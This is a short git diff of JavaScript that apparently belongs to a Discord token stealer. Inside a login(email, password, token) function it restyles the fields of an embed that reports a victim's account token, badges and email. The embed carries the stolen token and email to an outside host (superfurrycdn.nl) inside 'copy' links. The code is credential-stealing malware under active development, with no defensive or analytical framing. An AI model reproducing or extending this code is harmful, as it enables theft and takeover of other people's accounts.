@@ -324,7 +324,7 @@ const login = async (email, password, token) => {
             "fields": [
                 {
                     "name": "<a:sn1:989238042164351006> SN - Token:",
-                    "value": `\`\`\`${token}\`\`\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+                    "value": `\`\`\`${token}\`\`\`\n[📑 Click Here To Copy Token On Mobile](https://superfurrycdn.nl/copy/${token})`,
                     "inline": false
                 },
                 {
@@ -338,12 +338,12 @@ const login = async (email, password, token) => {
                     "inline": true
                 },
                 {
-                    "name": "**Badges:**",
+                    "name": "<:sn4:989240048157356062> SN - Badges:",
                     "value": `${badges}`,
                     "inline": true
                 },
                 {
-                    "name": "**Account Email**",
+                    "name": "SN - Email:",
                     "value": `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${email})`,
                     "inline": true
                 }, 
